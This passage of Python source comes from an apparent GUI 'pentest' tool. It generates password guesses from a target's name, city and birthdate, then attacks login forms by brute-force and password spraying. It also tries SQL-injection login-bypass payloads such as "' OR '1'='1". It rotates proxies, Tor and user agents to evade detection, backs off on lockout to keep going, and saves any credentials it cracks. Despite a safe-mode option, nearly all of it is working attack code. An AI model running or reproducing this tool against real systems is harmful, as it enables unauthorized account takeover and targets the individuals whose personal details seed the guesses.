		self.var_checkpoint_enabled.set(bool(profile.get("checkpoint", {}).get("enabled")))
		self.var_checkpoint_file.set(profile.get("checkpoint", {}).get("file", ""))
		self.var_resume_from_checkpoint.set(bool(profile.get("checkpoint", {}).get("resume")))
		# auto form
		self.var_auto_form.set(bool(profile.get("auto_form")))
		self.var_refresh_csrf.set(bool(profile.get("refresh_csrf")))
		# pre-login
		self.var_prelogin_enabled.set(bool(profile.get("prelogin", {}).get("enabled")))
		self.var_prelogin_urls.set(
			", ".join(profile.get("prelogin", {}).get("urls", []))
		)
		self.var_prelogin_per_attempt.set(bool(profile.get("prelogin", {}).get("per_attempt")))
		self.var_prelogin_js.set(bool(profile.get("prelogin", {}).get("headless_js")))
		# template and success signals
		self.var_body_mode.set(profile.get("body_mode", "params"))
		self.raw_body_text.delete('1.0', tk.END); self.raw_body_text.insert(tk.END, profile.get("raw_body", ""))
		self.var_success_require_redirect.set(bool(profile.get("success_require_redirect", False)))
		self.var_success_length_gt.set(int(profile.get("success_length_gt", 0)))
		# safe mode
		self.var_safe_mode.set(bool(profile.get("safe_auto_pause")))
		self.var_allowlist.set(", ".join(profile.get("allowlist", [])))
		self.var_safe_qps_cap.set(float(profile.get("safe_qps_cap", 1.0)))
		self.var_safe_concurrency_cap.set(int(profile.get("safe_concurrency_cap", 2)))
		self.var_safe_auto_pause.set(bool(profile.get("safe_auto_pause")))
		# flow
		self.var_flow_enabled.set(bool(profile.get("flow_enabled", False)))
		self.var_flow_per_attempt.set(bool(profile.get("flow_per_attempt", True)))
		self.flow_steps = list(profile.get("flow_steps", []))
		self._refresh_flow_view()
		# notes
		if hasattr(self, 'notes_text'):
			self.notes_text.delete('1.0', tk.END)
			self.notes_text.insert('1.0', profile.get('notes', ''))
		# http auth
		self.var_auth_type.set(profile.get('auth_type','None'))
		self.var_auth_user.set(profile.get('auth_user',''))
		self.var_auth_pass.set(profile.get('auth_pass',''))
		self.var_auth_domain.set(profile.get('auth_domain',''))
		# intruder
		self.var_intruder_enabled.set(bool(profile.get('intruder_enabled', False)))
		self.var_intruder_mode.set(profile.get('intruder_mode','sniper'))
		self.var_intruder_markers.set(','.join(profile.get('intruder_markers', [])))
		self.var_intruder_marker.set(profile.get('intruder_marker','§PAYLOAD§'))
		self.var_intruder_payloads_file.set(profile.get('intruder_payloads_file',''))
		self.var_intruder_builtin.set(profile.get('intruder_builtin','none'))
		try:
			self.intr_sets_box.delete('1.0', tk.END)
			self.intr_sets_box.insert('1.0', profile.get('intruder_sets_text',''))
		except Exception:
			pass

		self._info("Profile loaded")

	def _info(self, msg: str) -> None:
		self.status_var.set(msg)
		try:
			if self.use_bootstrap:
				TbMessagebox.show_info("Info", msg)
			else:
				messagebox.showinfo("Info", msg)
		except Exception:
			pass

	def _build_bruteforce_charset(self) -> str:
		combined = (
			self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get()
		)
		seen = set()
		unique_chars = ''.join([c for c in combined if not (c in seen or seen.add(c))])
		if self.var_include_uppercase.get():
			unique_chars += ''.join({c.upper() for c in unique_chars if c.isalpha()})
		if self.var_include_digits.get():
			unique_chars += string.digits
		special = self.var_special_chars.get() or ""
		charset = ''.join(sorted(set(unique_chars + special)))
		return charset

	def _estimate_smart_total(self, min_len: int, max_len: int) -> int:
		tokens = self._smart_tokens()
		base = len(tokens)
		variants_per_token = 6
		suffixes = 40
		combos = 0
		combos += base * variants_per_token
		combos += base * variants_per_token * suffixes
		combos += min(base * base, 2000) * variants_per_token
		combos = int(combos * 0.5)
		return max(1000, min(combos, 5_000_000))

	def _geom_series(self, n: int, a: int, b: int) -> int:
		if n == 1:
			return b - a + 1
		return (n ** (b + 1) - n ** a) // (n - 1)

	def _estimate_smart_bruteforce_total(self, min_len: int, max_len: int) -> int:
		charset = self._build_bruteforce_charset()
		if charset:
			freq = {}
			for ch in (self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get() + self.var_special_chars.get()):
				if not ch:
					continue
				freq[ch] = freq.get(ch, 0) + 1
			sorted_chars = [c for c, _ in sorted(freq.items(), key=lambda kv: kv[1], reverse=True)]
			reduced = ''.join(sorted(set((sorted_chars + list(charset)))))
			charset = ''.join(list(reduced)[:12])
		n = len(charset)
		return self._geom_series(n, min_len, max_len) if n > 0 else 0

	def _worker(self, args: dict) -> None:
		try:
			mode = args["mode"]
			min_len = args["min_len"]
			max_len = args["max_len"]
			gzip_out = args["gzip"]
			output_path = args["output_path"]
			pentest = args.get("pentest", {"enabled": False})

			if pentest.get("enabled"):
				completed, msg = self._worker_pentest(mode, min_len, max_len, pentest)
				self.ui_queue.put(("done", completed, msg))
				return

			# File output path
			try:
				if gzip_out:
					f = gzip.open(output_path, "wt", encoding="utf-8")
				else:
					f = open(output_path, "w", encoding="utf-8")
			except Exception as exc:
				self.ui_queue.put(("message", f"Failed to open output file: {exc}"))
				self.ui_queue.put(("done", 0, "Failed"))
				return

			completed = 0
			sample_sent = 0
			start = self.start_time or time.time()

			try:
				if mode == "Brute-force":
					charset = self._build_bruteforce_charset()
					total = self._geom_series(len(charset), min_len, max_len)
					self.total_estimated = total
					for L in range(min_len, max_len + 1):
						if self.cancel_requested:
							break
						for tup in itertools.product(charset, repeat=L):
							if self.cancel_requested:
								break
							pwd = ''.join(tup)
							f.write(pwd + "\n")
							completed += 1
							if sample_sent < 50:
								self.ui_queue.put(("sample", pwd))
								sample_sent += 1
							if completed % 5000 == 0:
								elapsed = time.time() - start
								self.ui_queue.put(("progress", completed, self.total_estimated, elapsed))
				elif mode == "Smart brute-force":
					self.total_estimated = self._estimate_smart_bruteforce_total(min_len, max_len)
					for pwd in self._smart_bruteforce_candidates(min_len, max_len):
						if self.cancel_requested:
							break
						f.write(pwd + "\n")
						completed += 1
						if sample_sent < 50:
							self.ui_queue.put(("sample", pwd))
							sample_sent += 1
						if completed % 5000 == 0:
							elapsed = time.time() - start
							self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
				else:
					for pwd in self._smart_candidates(min_len, max_len):
						if self.cancel_requested:
							break
						f.write(pwd + "\n")
						completed += 1
						if sample_sent < 50:
							self.ui_queue.put(("sample", pwd))
							sample_sent += 1
						if completed % 5000 == 0:
							elapsed = time.time() - start
							self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
			finally:
				try:
					f.close()
				except Exception:
					pass

			self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), time.time() - start))
			self.ui_queue.put(("done", completed, f"Completed. Generated {completed:,} candidates. Saved to: {output_path}"))
		except Exception as exc:
			self.ui_queue.put(("log", f"Worker crashed: {exc}"))
			self.ui_queue.put(("done", 0, "Failed"))

	def _parse_list_file(self, path: str) -> list[str]:
		try:
			lines: list[str] = []
			with open(path, "r", encoding="utf-8", errors="ignore") as f:
				for line in f:
					w = line.strip()
					if w:
						lines.append(w)
			return lines
		except Exception as exc:
			self.ui_queue.put(("log", f"Failed to read list file {path}: {exc}"))
			return []

	def _collect_usernames(self, fallback_username: str) -> list[str]:
		usernames: list[str] = []
		# From single value
		if fallback_username:
			usernames.append(fallback_username)
		# From loaded file
		usernames.extend(self.loaded_usernames)
		# From patterns
		if self.var_generate_patterns.get():
			patterns = self._generate_username_patterns()
			usernames.extend(patterns)
		# Common aliases
		if self.var_common_aliases.get():
			usernames.extend(["admin", "administrator", "user", "test", "guest", "root"])
		# Deduplicate
		clean = []
		seen = set()
		for u in usernames:
			u2 = u.strip()
			if not u2:
				continue
			if self.var_lowercase_usernames.get():
				u2 = u2.lower()
			if u2 not in seen:
				seen.add(u2)
				clean.append(u2)
		return clean

	def _generate_username_patterns(self) -> list[str]:
		first = (self.var_name.get() or "").strip().split(" ")[0] if (self.var_name.get() or "").strip() else ""
		last = (self.var_surname.get() or "").strip().split(" ")[-1] if (self.var_surname.get() or "").strip() else ""
		if not first and not last:
			return []
		f = first[:1]
		l = last[:1]
		combos = set([
			first + last,
			first + "." + last,
			f + last,
			first + l,
			f + last,
			last + first,
			last + "." + first,
			first + "_" + last,
			first + "-" + last,
			last + "_" + first,
			last + "-" + first,
		])
		domain = (self.var_email_domain.get() or "").strip()
		results: list[str] = []
		for c in combos:
			if not c:
				continue
			if domain:
				results.append(f"{c}@{domain}")
			results.append(c)
		return results

	def _smart_tokens(self) -> list[str]:
		tokens: list[str] = []
		base_parts = [self.var_name.get(), self.var_surname.get(), self.var_city.get(), self.var_birthdate.get()]
		for part in base_parts:
			part = (part or "").strip()
			if not part:
				continue
			for t in filter(None, itertools.chain.from_iterable([p.split(sep) for sep in [" ", "-", "_", ".", ",", "/"] for p in [part]])):
				tokens.append(t)
				if t.isdigit() and 2 <= len(t) <= 4:
					tokens.append(t)
		wordlist_path = os.path.join(os.getcwd(), "wordlist.txt")
		if os.path.exists(wordlist_path):
			try:
				with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wf:
					for i, line in enumerate(wf):
						if i >= 1000:
							break
						w = line.strip()
						if w:
							tokens.append(w)
			except Exception:
				pass
		seen = set()
		deduped = []
		for t in tokens:
			if t not in seen:
				seen.add(t)
				deduped.append(t)
		return deduped[:2000]

	def _mutate_cases_and_leet(self, token: str) -> list[str]:
		variants = set()
		if not token:
			return []
		s = token
		variants.add(s)
		variants.add(s.lower())
		variants.add(s.upper())
		variants.add(s.capitalize())
		leet_map = str.maketrans({"a": "@", "A": "@", "e": "3", "E": "3", "i": "1", "I": "1", "o": "0", "O": "0", "s": "5", "S": "5"})
		variants.add(s.translate(leet_map))
		variants.add(s.lower().translate(leet_map))
		return [v for v in variants if v]

	def _smart_candidates(self, min_len: int, max_len: int):
		specials = list(self.var_special_chars.get() or "")
		years = [str(y) for y in range(1970, datetime.now().year + 1)]
		simple_suffixes = ["", "!", "?", ".", "_", "-", "#"]

		tokens = self._smart_tokens()
		variants_cache: dict[str, list[str]] = {}

		def within_bounds(pw: str) -> bool:
			return min_len <= len(pw) <= max_len

		emitted = set()
		count = 0
		limit = 5_000_000

		for t in tokens:
			if count >= limit:
				break
			variants = variants_cache.setdefault(t, self._mutate_cases_and_leet(t))
			for v in variants:
				if count >= limit:
					break
				if within_bounds(v) and v not in emitted:
					emitted.add(v); count += 1; yield v
				for suf in itertools.chain(simple_suffixes, specials):
					if count >= limit:
						break
					pw = v + suf
					if within_bounds(pw) and pw not in emitted:
						emitted.add(pw); count += 1; yield pw
				for n in range(0, 100):
					if count >= limit:
						break
					pw = f"{v}{n}"
					if within_bounds(pw) and pw not in emitted:
						emitted.add(pw); count += 1; yield pw
				for y in years[-50:]:
					if count >= limit:
						break
					pw = f"{v}{y}"
					if within_bounds(pw) and pw not in emitted:
						emitted.add(pw); count += 1; yield pw

		for a, b in itertools.islice(itertools.product(tokens, tokens), 0, 2000):
			if count >= limit:
				break
			for av in variants_cache.setdefault(a, self._mutate_cases_and_leet(a)):
				for bv in variants_cache.setdefault(b, self._mutate_cases_and_leet(b)):
					if count >= limit:
						break
					pw = av + bv
					if within_bounds(pw) and pw not in emitted:
						emitted.add(pw); count += 1; yield pw
					for sep in itertools.chain(["", "_", "-", "."], specials):
						if count >= limit:
							break
						pw2 = av + sep + bv
						if within_bounds(pw2) and pw2 not in emitted:
							emitted.add(pw2); count += 1; yield pw2

	def _smart_bruteforce_candidates(self, min_len: int, max_len: int):
		base = self._build_bruteforce_charset()
		if not base:
			return
		freq = {}
		for ch in (self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get() + self.var_special_chars.get()):
			if not ch:
				continue
			freq[ch] = freq.get(ch, 0) + 1
		prioritized = []
		for c, _ in sorted(freq.items(), key=lambda kv: kv[1], reverse=True):
			if c in base and c not in prioritized:
				prioritized.append(c)
			if len(prioritized) >= 12:
				break
		for c in base:
			if c not in prioritized and len(prioritized) < 12:
				prioritized.append(c)
		charset = ''.join(prioritized)
		for L in range(min_len, max_len + 1):
			for tup in itertools.product(charset, repeat=L):
				yield ''.join(tup)

	# Pentest helpers and worker
	def _parse_codes(self, csv_codes: str) -> set[int]:
		result: set[int] = set()
		for part in (csv_codes or "").split(','):
			part = part.strip()
			if not part:
				continue
			try:
				result.add(int(part))
			except ValueError:
				pass
		return result or {200, 302}

	def _compile_regex(self, pattern: str):
		if not pattern:
			return None
		try:
			return re.compile(pattern, re.I)
		except re.error:
			return None

	def _parse_extra_params(self, raw: str) -> dict[str, str]:
		params: dict[str, str] = {}
		if not raw:
			return params
		for pair in raw.split('&'):
			if '=' in pair:
				k, v = pair.split('=', 1)
				params[k.strip()] = v.strip()
		return params

	def _parse_headers_json(self, raw: str) -> dict[str, str]:
		if not raw:
			return {}
		try:
			obj = json.loads(raw)
			return obj if isinstance(obj, dict) else {}
		except Exception:
			self.ui_queue.put(("log", "Invalid headers JSON; ignoring."))
			return {}

	def _parse_cookies(self, raw: str) -> dict[str, str]:
		result: dict[str, str] = {}
		if not raw:
			return result
		parts = [p.strip() for p in raw.split(';') if p.strip()]
		for p in parts:
			if '=' in p:
				k, v = p.split('=', 1)
				result[k.strip()] = v.strip()
		return result

	def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str, call_headers: dict | None = None, call_proxies: dict | None = None, call_params_extra: dict | None = None):
		url = cfg['url']
		method = cfg['method']
		user_param = cfg['user_param']
		pass_param = cfg['pass_param']
		extra = dict(cfg.get('extra_params', {}))
		if call_params_extra:
			extra.update(call_params_extra)
		# Build payload depending on mode
		body_mode = cfg.get('body_mode', 'params')
		raw_body = cfg.get('raw_body', '')
		data = None
		json_payload = None
		if body_mode == 'params' or method.upper() == 'GET':
			data = {user_param: username, pass_param: password, **extra}
		else:
			# replace placeholders
			templ = (raw_body or '')
			try:
				for k,v in {"username": username, "password": password}.items():
					templ = templ.replace(f"{{{{{k}}}}}", v)
				# also replace extra params if present
				for k,v in extra.items():
					templ = templ.replace(f"{{{{{k}}}}}", str(v))
			except Exception:
				pass
			if body_mode == 'json':
				try:
					json_payload = json.loads(templ)
				except Exception:
					data = templ
			else:
				data = templ
		try:
			if method == 'GET':
				# optional pre-flow
				if cfg.get('flow_enabled') and cfg.get('flow_per_attempt') and self.flow_steps:
					try:
						self._run_flow_sync(sess, cfg, username, password)
					except Exception as _flow_exc:
						self.ui_queue.put(("log", f"Flow error (ignored): {_flow_exc}"))
				# template any string values in params
				if isinstance(data, dict) and self.flow_context_last:
					for k in list(data.keys()):
						val = data[k]
						if isinstance(val, str):
							for ck, cv in self.flow_context_last.items():
								val = val.replace(f"{{{{{ck}}}}}", str(cv))
							data[k] = val
				ipl = cfg.get('intruder_payload_current')
				if isinstance(ipl, dict):
					for mk, pv in ipl.items():
						if mk:
							url = url.replace(mk, str(pv))
				elif ipl is not None:
					marker = cfg.get('intruder_marker') or ''
					if marker:
						url = url.replace(marker, str(ipl))
				resp = sess.get(url, params=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies, auth=self._build_http_auth(cfg, username, password))
			else:
				if cfg.get('flow_enabled') and cfg.get('flow_per_attempt') and self.flow_steps:
					try:
						self._run_flow_sync(sess, cfg, username, password)
					except Exception as _flow_exc:
						self.ui_queue.put(("log", f"Flow error (ignored): {_flow_exc}"))
				# Apply templating to raw/json payloads
				if isinstance(data, str) and self.flow_context_last:
					for ck, cv in self.flow_context_last.items():
						data = data.replace(f"{{{{{ck}}}}}", str(cv))
				if json_payload is not None and self.flow_context_last:
					try:
						def _walk(obj):
							if isinstance(obj, dict):
								return {k: _walk(v) for k, v in obj.items()}
							if isinstance(obj, list):
								return [_walk(x) for x in obj]
							if isinstance(obj, str):
								for ck, cv in self.flow_context_last.items():
									obj = obj.replace(f"{{{{{ck}}}}}", str(cv))
								return obj
							return obj
						json_payload = _walk(json_payload)
					except Exception:
						pass
				if json_payload is not None:
					resp = sess.post(url, json=json_payload, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies, auth=self._build_http_auth(cfg, username, password))
				else:
					resp = sess.post(url, data=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies, auth=self._build_http_auth(cfg, username, password))
			return resp
		except Exception as exc:
			self.ui_queue.put(("log", f"Request error: {exc}"))
			return None

	def _is_success(self, resp, cfg: dict) -> bool:
		if resp is None:
			return False
		status_ok = (resp.status_code in cfg['success_codes']) if cfg['success_codes'] else True
		text = resp.text or ""
		fail_re = cfg.get('failure_regex')
		succ_re = cfg.get('success_regex')
		if fail_re and fail_re.search(text):
			return False
		if succ_re and not succ_re.search(text):
			return False
		# Redirect requirement
		if cfg.get('success_require_redirect') and not (300 <= resp.status_code < 400):
			return False
		# Length threshold
		min_len = int(cfg.get('success_length_gt') or 0)
		if min_len > 0 and len(text) < min_len:
			return False
		return status_ok

	def _is_lockout(self, resp, cfg: dict) -> bool:
		if resp is None or not cfg.get('lockout_enabled'):
			return False
		if resp.status_code in (cfg.get('lockout_codes') or set()):
			return True
		lock_re = cfg.get('lockout_regex')
		if lock_re:
			try:
				text = resp.text or ""
			except Exception:
				text = ""
			if lock_re.search(text):
				return True
		return False

	def _configure_session(self, sess: requests.Session, cfg: dict) -> None:
		try:
			if cfg.get('headers'):
				sess.headers.update(cfg['headers'])
			if cfg.get('cookies'):
				sess.cookies.update(cfg['cookies'])
			if cfg.get('proxies'):
				sess.proxies.update(cfg['proxies'])
			sess.verify = cfg.get('verify', True)
		except Exception as exc:
			self.ui_queue.put(("log", f"Session configuration error: {exc}"))

	def _run_sqli_checks(self, sess: requests.Session, cfg: dict) -> tuple[bool, str]:
		field = cfg.get('sqli_field', 'password')
		username = cfg['username']
		self.ui_queue.put(("log", f"[SQLi] Starting checks on {field} field…"))
		limiter = RateLimiter(cfg['qps'])
		for payload in self._sqli_payloads():
			if self.cancel_requested:
				break
			if field == 'username':
				u, p = payload, 'x'
			else:
				u, p = username, payload
			limiter.acquire()
			resp = self._http_attempt(sess, cfg, u, p)
			if self._is_success(resp, cfg):
				msg = f"[SQLi] Possible SQL injection success with {field} payload: {payload!r}"
				self.ui_queue.put(("log", msg))
				return True, msg
			else:
				code = getattr(resp, 'status_code', '?')
				self.ui_queue.put(("log", f"[SQLi] tried: {payload!r} -> status {code}"))
		return False, ""

	def _sqli_payloads(self) -> list[str]:
		return [
			"' OR '1'='1",
			'" OR "1"="1',
			"' OR 1=1 -- ",
			"' OR '1'='1' -- ",
			"admin'--",
			"' OR 'x'='x",
			"') OR ('1'='1",
			"' OR 1=1#",
		]

	def _worker_pentest(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
		# Protocol switch
		proto = (cfg.get('protocol') or 'HTTP').upper()
		if proto == 'SSH':
			return self._worker_pentest_ssh(mode, min_len, max_len, cfg)
		elif proto == 'FTP':
			self.ui_queue.put(("log", "FTP spray not implemented yet"))
			return 0, "FTP spray not implemented yet"
		# HTTP path
		completed = 0
		found_msg = ""
		start = self.start_time or time.time()
		limiter = RateLimiter(cfg['qps'])
		total_ref = max(self.total_estimated, 1)

		# Optional SQLi pre-checks (single-thread)
		if cfg.get('async_engine') and httpx is not None:
			ok, msg = self._run_async_sqli_checks(cfg)
			if ok:
				return completed, msg
		else:
			try:
				base_sess = requests.Session()
				self._configure_session(base_sess, cfg)
				if cfg.get('enable_sqli'):
					ok, msg = self._run_sqli_checks(base_sess, cfg)
					if ok:
						return completed, msg
			except Exception as exc:
				self.ui_queue.put(("log", f"Pentest setup error: {exc}"))
			finally:
				try:
					base_sess.close()
				except Exception:
					pass

		# Shared lockout state
		lockout_lock = threading.Lock()
		lockout_until = [0.0]  # mutable box

		def wait_if_locked():
			while True:
				if self.cancel_requested:
					return
				with lockout_lock:
					t = lockout_until[0]
				now = time.time()
				if now >= t:
					return
				# sleep a bit until lockout expires
				time.sleep(0.2)

		def trigger_lockout_backoff():
			with lockout_lock:
				base = float(cfg.get('lockout_cooldown_sec', 0.0))
				if cfg.get('lockout_jitter'):
					# +/- 15% jitter
					jitter = base * 0.15
					delay = max(1.0, base + (jitter * (2.0 * (time.time() % 1.0) - 0.5)))
				else:
					delay = max(1.0, base)
				lockout_until[0] = max(lockout_until[0], time.time() + delay)
			self.ui_queue.put(("log", f"[Lockout] Detected; backing off for ~{int(delay)}s"))
			# Safe mode auto-pause
			if cfg.get('safe_auto_pause'):
				self.cancel_requested = True
				self.ui_queue.put(("log", "[Safe Mode] Auto-paused due to lockout"))

		def run_batch(pair_iterable) -> bool:
			# returns True if success found and stop
			nonlocal completed, found_msg
			q = queue.Queue(maxsize=2000)
			stop_event = threading.Event()
			progress_lock = threading.Lock()
			# rotation state
			proxy_cycle_lock = threading.Lock()
			ua_cycle_lock = threading.Lock()
			proxy_index = [0]
			ua_index = [0]
			use_async = bool(cfg.get('async_engine')) and (httpx is not None)
			# resume indices (only for spraying)
			resume_pwd_idx = 0
			resume_user_idx = 0
			if cfg.get('checkpoint', {}).get('resume') and cfg.get('checkpoint', {}).get('enabled'):
				state = self._load_checkpoint(cfg)
				if state and state.get('spray'):
					resume_pwd_idx = int(state.get('pwd_idx', 0))
					resume_user_idx = int(state.get('user_idx', 0))

			def build_proxies_dict(proxy_url: str | None):
				if not proxy_url:
					return None
				return {'http': proxy_url, 'https': proxy_url}

			def next_proxy_url(for_worker: bool = False) -> str | None:
				# Determine proxy for request/worker
				if cfg.get('tor_mode'):
					return cfg.get('tor_proxy')
				lst = cfg.get('proxies_list') or []
				if not lst:
					# fallback to single proxies config
					p = cfg.get('proxies')
					if isinstance(p, dict):
						return p.get('http') or p.get('https')
					return None
				if cfg.get('proxy_rotation') == 'per_worker' and for_worker:
					# Assign a stable proxy per worker by index
					with proxy_cycle_lock:
						url = lst[proxy_index[0] % len(lst)]
						proxy_index[0] += 1
						return url
				# per request
				with proxy_cycle_lock:
					url = lst[proxy_index[0] % len(lst)]
					proxy_index[0] += 1
					return url

			def next_user_agent(for_worker: bool = False) -> str | None:
				if (cfg.get('ua_rotation') or 'none') == 'none':
					return None
				lst = cfg.get('user_agents') or []
				if not lst:
					return None
				if cfg.get('ua_rotation') == 'per_worker' and for_worker:
					with ua_cycle_lock:
						ua = lst[ua_index[0] % len(lst)]
						ua_index[0] += 1
						return ua
				with ua_cycle_lock:
					ua = lst[ua_index[0] % len(lst)]
					ua_index[0] += 1
					return ua

			def producer():
				try:
					# Wrap pair_iterable to apply resume for spraying
					it = pair_iterable
					if cfg.get('spray_enabled'):
						usernames = cfg.get('usernames', [])
						passwords = cfg.get('spray_passwords', [])
						def gen_pairs():
							for pi, pwd in enumerate(passwords):
								if pi < resume_pwd_idx:
									continue
								start_ui = resume_user_idx if pi == resume_pwd_idx else 0
								for ui, user in enumerate(usernames):
									if ui < start_ui:
										continue
									yield (user, pwd)
						it = gen_pairs()
					for pair in it:
						if self.cancel_requested or stop_event.is_set():
							break
						try:
							q.put(pair, timeout=0.5)
						except queue.Full:
							if self.cancel_requested or stop_event.is_set():
								break
							continue
				except Exception as exc:
					self.ui_queue.put(("log", f"Producer error: {exc}"))
				finally:
					for _ in range(cfg['concurrency']):
						try:
							q.put_nowait((None, None))
						except Exception:
							pass

			def worker(worker_id: int):
				nonlocal completed, found_msg
				sess = requests.Session()
				self._configure_session(sess, cfg)
				# Per-worker assignments
				per_worker_proxy = next_proxy_url(for_worker=True) if cfg.get('proxy_rotation') == 'per_worker' else None
				if per_worker_proxy:
					try:
						sess.proxies.update(build_proxies_dict(per_worker_proxy) or {})
					except Exception:
						pass
				per_worker_ua = next_user_agent(for_worker=True) if cfg.get('ua_rotation') == 'per_worker' else None
				if per_worker_ua:
					sess.headers['User-Agent'] = per_worker_ua
				try:
					while not self.cancel_requested and not stop_event.is_set():
						try:
							user, pwd = q.get(timeout=0.5)
						except queue.Empty:
							continue
						if user is None:
							break
						try:
							wait_if_locked()
							if self.cancel_requested or stop_event.is_set():
								break
							limiter.acquire()
							self._wait_global_backoff()
							# Per-request overrides
							call_headers = None
							call_proxies = None
							if cfg.get('ua_rotation') == 'per_request':
								ua = next_user_agent()
								if ua:
									call_headers = dict(sess.headers)
									call_headers['User-Agent'] = ua
							if cfg.get('proxy_rotation') == 'per_request' or cfg.get('tor_mode') or not sess.proxies:
								purl = next_proxy_url()
								call_proxies = build_proxies_dict(purl)
										# Per-attempt CSRF refresh
							params_extra = None
							if cfg.get('refresh_csrf'):
								params_extra = self._fetch_csrf_sync(sess, cfg)
							t0 = time.time()
							resp = self._http_attempt(sess, cfg, user, pwd, call_headers=call_headers, call_proxies=call_proxies, call_params_extra=params_extra)
							lat = time.time() - t0
							# Lockout detection
							locked = self._is_lockout(resp, cfg)
							if locked:
								trigger_lockout_backoff()
							success = self._is_success(resp, cfg)
							error = (resp is None)
							self._record_attempt(lat, getattr(resp, 'status_code', None), success, locked, error)
							# Fail-fast check
							if self._check_failfast(cfg):
								stop_event.set(); break
							# Attempt log
							ua_used = None
							try:
								ua_used = (call_headers or {}).get('User-Agent') or sess.headers.get('User-Agent')
							except Exception:
								ua_used = None
							proxy_used = None
							try:
								proxy_used = (call_proxies or sess.proxies or {}).get('http') or (call_proxies or sess.proxies or {}).get('https')
							except Exception:
								proxy_used = None
							if self._log_fp:
								self._log_line([
									datetime.now().isoformat(timespec='seconds'),
									user,
									pwd,
									getattr(resp, 'status_code', ''),
									int(lat*1000),
									int(bool(success)),
									int(bool(locked)),
									int(bool(error)),
									proxy_used or '',
									ua_used or '',
								])
							with progress_lock:
								completed += 1
								if completed % 100 == 0:
									elapsed = time.time() - start
									self.ui_queue.put(("progress", completed, max(total_ref, completed), elapsed))
								if completed <= 50:
									self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
							# Save checkpoint periodically (spray only)
							if cfg.get('checkpoint', {}).get('enabled') and cfg.get('spray_enabled'):
								try:
									ul = max(1, len(cfg.get('usernames', [])))
									pwd_idx = completed // ul
									user_idx = completed % ul
									if (completed % self._checkpoint_every_attempts) == 0:
										self._save_checkpoint(cfg, pwd_idx, user_idx)
								except Exception:
									pass
							if success:
								found_msg = f"SUCCESS: {user} / {pwd}"
								# record for reporting/exports
								try:
									self.found_credentials.append({
										"timestamp": datetime.now().isoformat(timespec='seconds'),
										"username": user,
										"password": pwd,
										"status": getattr(resp, 'status_code', ''),
										"latency_ms": int(lat*1000),
										"proxy": proxy_used or '',
										"ua": ua_used or '',
									})
								except Exception:
									pass
								self.ui_queue.put(("log", found_msg))
								stop_event.set()
								break
						except Exception as exc:
							self.ui_queue.put(("log", f"Worker {worker_id} error: {exc}"))
						finally:
							try:
								q.task_done()
							except Exception:
								pass
				finally:
					try:
						sess.close()
					except Exception:
						pass

			threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(cfg['concurrency'])]
			prod_thread = threading.Thread(target=producer, daemon=True)
			prod_thread.start()
			for t in threads:
				t.start()
			try:
				q.join()
			except Exception:
				pass
			stop_event.set()
			for t in threads:
				try:
					t.join(timeout=1.0)
				except Exception:
					pass
			return stop_event.is_set() and bool(found_msg)

		# Build batches depending on spray setting
		if cfg.get('spray_enabled'):
			usernames = cfg.get('usernames', [])
			for pwd in cfg.get('spray_passwords', []):
				if self.cancel_requested:
					break
				# Run one round: iterate all usernames for this password
				if run_batch(((u, pwd) for u in usernames)):
					if cfg.get('spray_stop_on_success', True):
						break
				# Cooldown between rounds
				cooldown = float(cfg.get('spray_cooldown_sec', 0.0))
				if cooldown > 0 and not self.cancel_requested:
					end_time = time.time() + cooldown
					while time.time() < end_time:
						if self.cancel_requested:
							break
						time.sleep(0.5)
				# Save checkpoint at end of each password round
				if cfg.get('checkpoint', {}).get('enabled') and cfg.get('spray_enabled'):
					try:
						self._save_checkpoint(cfg, (cfg.get('spray_passwords', []).index(pwd) + 1), 0)
					except Exception:
						pass
		else:
			# Not spraying: iterate password candidates for a single/fixed username list (first one)
			fixed_users = cfg.get('usernames', []) or [cfg.get('username')]
			fixed_user = fixed_users[0]
			if mode == 'Brute-force':
				pw_iter = self._bruteforce_stream(min_len, max_len)
			elif mode == 'Smart brute-force':
				pw_iter = self._smart_bruteforce_candidates(min_len, max_len)
			else:
				pw_iter = self._smart_candidates(min_len, max_len)
			run_batch(((fixed_user, pw) for pw in pw_iter))

		if not found_msg:
			found_msg = f"Pentest run finished. Attempts: {completed:,}. No success criteria met."
		return completed, found_msg

	def _bruteforce_stream(self, min_len: int, max_len: int):
		charset = self._build_bruteforce_charset()
		for L in range(min_len, max_len + 1):
			for tup in itertools.product(charset, repeat=L):
				yield ''.join(tup)

	# UI callbacks
	def on_browse_usernames_file(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
		if not path:
			return
		self.var_usernames_file.set(path)
		self.loaded_usernames = self._parse_list_file(path)
		self.var_usernames_count.set(f"loaded: {len(self.loaded_usernames)}")

	def on_browse_passwords_file(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
		if not path:
			return
		self.var_spray_passwords_file.set(path)

	def on_browse_proxy_list_file(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
		if not path:
			return
		self.var_proxy_list_file.set(path)
		self.loaded_proxies = self._parse_list_file(path)
		self.ui_queue.put(("log", f"Loaded {len(self.loaded_proxies)} proxies"))

	def on_browse_user_agent_list_file(self) -> None:
		path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
		if not path:
			return
		self.var_user_agent_list_file.set(path)
		self.loaded_user_agents = self._parse_list_file(path)
		self.ui_queue.put(("log", f"Loaded {len(self.loaded_user_agents)} user-agents"))

	def on_use_target_domain(self) -> None:
		url = self.var_target_url.get().strip()
		if not url:
			return
		try:
			host = urlparse(url).hostname or ""
			parts = host.split('.') if host else []
